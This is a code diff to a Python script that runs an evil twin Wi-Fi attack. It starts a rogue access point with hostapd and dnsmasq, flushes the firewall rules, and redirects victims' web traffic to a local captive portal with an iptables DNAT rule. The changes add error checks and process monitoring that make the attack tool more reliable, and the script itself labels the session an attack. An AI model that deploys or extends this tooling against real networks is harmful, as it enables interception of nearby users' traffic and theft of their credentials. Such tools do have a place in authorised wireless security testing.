@@ -896,16 +896,45 @@ def setup_ap() -> bool:
     global HOSTAPD_PROC, DNSMASQ_PROC
     logging.info("Setting up Access Point...")
 
+    for proc_name, proc in (("hostapd", HOSTAPD_PROC), ("dnsmasq", DNSMASQ_PROC)):
+        if proc and proc.poll() is None:
+            logging.warning("Stopping existing %s process.", proc_name)
+            stop_process(proc)
+    HOSTAPD_PROC = None
+    DNSMASQ_PROC = None
+
     try:
-        time.sleep(2)
+        iface_check = subprocess.run(
+            ["ip", "link", "show", AP_INTERFACE],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            check=False,
+        )
+        if iface_check.returncode != 0:
+            logging.error("Interface %s does not exist.", AP_INTERFACE)
+            return False
 
-        subprocess.run(["ip", "link", "set", AP_INTERFACE, "down"])
+        subprocess.run(["ip", "link", "set", AP_INTERFACE, "down"], stderr=subprocess.DEVNULL, check=False)
         time.sleep(1)
-        subprocess.run(["ip", "link", "set", AP_INTERFACE, "up"])
+        subprocess.run(["ip", "link", "set", AP_INTERFACE, "up"], stderr=subprocess.DEVNULL, check=False)
         time.sleep(1)
 
-        subprocess.run(["ip", "addr", "flush", "dev", AP_INTERFACE])
-        subprocess.run(["ip", "addr", "add", f"{AP_IP}/24", "dev", AP_INTERFACE])
+        subprocess.run(["ip", "addr", "flush", "dev", AP_INTERFACE], stderr=subprocess.DEVNULL, check=False)
+        addr_add = subprocess.run(
+            ["ip", "addr", "add", f"{AP_IP}/24", "dev", AP_INTERFACE],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.PIPE,
+            text=True,
+            check=False,
+        )
+        if addr_add.returncode != 0:
+            logging.error(
+                "Failed to assign %s/24 to %s: %s",
+                AP_IP,
+                AP_INTERFACE,
+                (addr_add.stderr or "").strip() or "unknown error",
+            )
+            return False
 
         hostapd_conf = f"""
 interface={AP_INTERFACE}
@@ -926,8 +955,15 @@ ignore_broadcast_ssid=0
             ["hostapd", "/tmp/hostapd.conf"],
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE,
+            text=True,
         )
-        time.sleep(3)
+        time.sleep(2)
+        if HOSTAPD_PROC.poll() is not None:
+            _, stderr = HOSTAPD_PROC.communicate()
+            logging.error("hostapd failed to start. Exit code: %s", HOSTAPD_PROC.returncode)
+            if stderr:
+                logging.error("hostapd error: %s", stderr.strip())
+            return False
 
         dnsmasq_conf = f"""
 interface={AP_INTERFACE}
@@ -943,18 +979,33 @@ log-dhcp
         with open("/tmp/dnsmasq.conf", "w") as f:
             f.write(dnsmasq_conf)
 
+        subprocess.run(
+            ["pkill", "-f", f"dnsmasq.*{AP_INTERFACE}"],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            check=False,
+        )
+        time.sleep(0.8)
+
         DNSMASQ_PROC = subprocess.Popen(
             ["dnsmasq", "-C", "/tmp/dnsmasq.conf", "--no-daemon"],
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE,
+            text=True,
         )
         time.sleep(2)
+        if DNSMASQ_PROC.poll() is not None:
+            _, stderr = DNSMASQ_PROC.communicate()
+            logging.error("dnsmasq failed to start. Exit code: %s", DNSMASQ_PROC.returncode)
+            if stderr:
+                logging.error("dnsmasq error: %s", stderr.strip())
+            return False
 
         subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-        subprocess.run(["iptables", "-t", "nat", "-F"])
-        subprocess.run(["iptables", "-F"])
-        subprocess.run(
+        subprocess.run(["iptables", "-t", "nat", "-F"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
+        subprocess.run(["iptables", "-F"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
+        nat_rule = subprocess.run(
             [
                 "iptables",
                 "-t",
@@ -971,8 +1022,18 @@ log-dhcp
                 "DNAT",
                 "--to-destination",
                 f"{AP_IP}:80",
-            ]
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.PIPE,
+            text=True,
+            check=False,
         )
+        if nat_rule.returncode != 0:
+            logging.error(
+                "Failed to add iptables redirect rule: %s",
+                (nat_rule.stderr or "").strip() or "unknown error",
+            )
+            return False
 
         logging.info(f"Access Point '{AP_SSID}' started on {AP_IP}")
         logging.info(f"DHCP range: {DHCP_RANGE_START} - {DHCP_RANGE_END}")
@@ -1182,8 +1243,6 @@ def run_twins_session() -> bool:
         style("STOP the attack", COLOR_STOP, STYLE_BOLD),
     )
 
-    processes = [HOSTAPD_PROC, DNSMASQ_PROC]
-
     restart_delay = 2
     try:
         while True:
@@ -1220,10 +1279,19 @@ def run_twins_session() -> bool:
                     logging.warning("Please enter B or R.")
                 return restart_requested
 
-            for i, proc in enumerate(processes):
-                if proc and proc.poll() is not None:
-                    logging.error(f"Process {i} died!")
-                    return False
+            if HOSTAPD_PROC and HOSTAPD_PROC.poll() is not None:
+                _, stderr = HOSTAPD_PROC.communicate()
+                logging.error("hostapd died! Exit code: %s", HOSTAPD_PROC.returncode)
+                if stderr:
+                    logging.error("hostapd error: %s", stderr.strip())
+                return False
+
+            if DNSMASQ_PROC and DNSMASQ_PROC.poll() is not None:
+                _, stderr = DNSMASQ_PROC.communicate()
+                logging.error("dnsmasq died! Exit code: %s", DNSMASQ_PROC.returncode)
+                if stderr:
+                    logging.error("dnsmasq error: %s", stderr.strip())
+                return False
     except KeyboardInterrupt:
         logging.info(color_text("Stopping attack...", COLOR_STOP))
     finally:
